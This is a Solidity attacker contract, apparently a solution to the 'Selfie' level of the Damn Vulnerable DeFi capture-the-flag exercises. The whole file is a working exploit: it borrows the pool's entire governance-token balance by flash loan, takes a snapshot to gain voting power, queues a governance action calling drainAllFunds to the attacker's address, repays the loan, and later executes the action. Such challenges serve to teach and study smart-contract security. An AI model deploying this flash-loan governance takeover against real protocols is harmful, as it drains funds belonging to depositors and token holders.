pragma solidity ^0.6.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttacker {

    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public governanceToken;
    address attacker;
    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableTokenSnapshot _governanceToken) public {
        pool = _pool;
        governance = _governance;
        governanceToken = _governanceToken;
        attacker = msg.sender;
    }

    function prepareAttack() external {
        // Take all balance from flash loan
        uint256 balance = governanceToken.balanceOf(address(pool));
        pool.flashLoan(balance);
    }

    function receiveTokens(address, uint256 amount) public {
        // Take snapshot of current balance
        governanceToken.snapshot();

        // Encode and propose drainAllFunds function to governance
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(pool), data, 0);

        // Return flash loan
        governanceToken.transfer(address(pool), amount);
    }

    function attack() external {
        // Execute malisious action
        governance.executeAction(actionId);
    }
}